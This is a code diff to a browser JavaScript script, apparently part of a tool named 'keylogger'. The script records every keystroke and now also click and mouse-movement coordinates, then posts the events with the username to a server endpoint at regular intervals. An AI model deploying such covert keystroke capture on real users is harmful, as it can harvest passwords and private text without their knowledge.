@@ -4,13 +4,24 @@ var events = [];
 function logEvent(evt) {
     console.log(evt);
     var data;
+    var x;
+    var y;
     let type = evt.type;
     switch(type) {
         case "keydown":
         case "keyup":
             data = evt.key;
+            break;
+        case "click":
+        case "contextmenu":
+        case "dblclick":
+        case "wheel":
+        case "mousemove":
+            x = evt.clientX;
+            y = evt.clientY;
+            break;
     }
-    events.push({ time: Date.now(), type: type, data: data });
+    events.push({ time: Date.now(), type: type, data: data, x: x, y: y });
 }
 window.addEventListener("keydown", logEvent);
 window.addEventListener("keyup", logEvent);
@@ -18,6 +29,7 @@ window.addEventListener("click", logEvent);
 window.addEventListener("contextmenu", logEvent);
 window.addEventListener("dblclick", logEvent);
 window.addEventListener("wheel", logEvent);
+window.addEventListener("mousemove", logEvent);
 
 // Push to server at regular intervals
 // Reduce interval timing for more frequent recordings, but increases server load
@@ -27,7 +39,6 @@ window.setInterval(function () {
       eventsToSend = events;
       events = [];
       var data = JSON.stringify({ user: username, events: eventsToSend });
-      console.log(data);
 
       let url = `${window.location.origin}/${web_root}/keylogger/logger-srv.php`;
       fetch(url, { method: 'post', body: data })
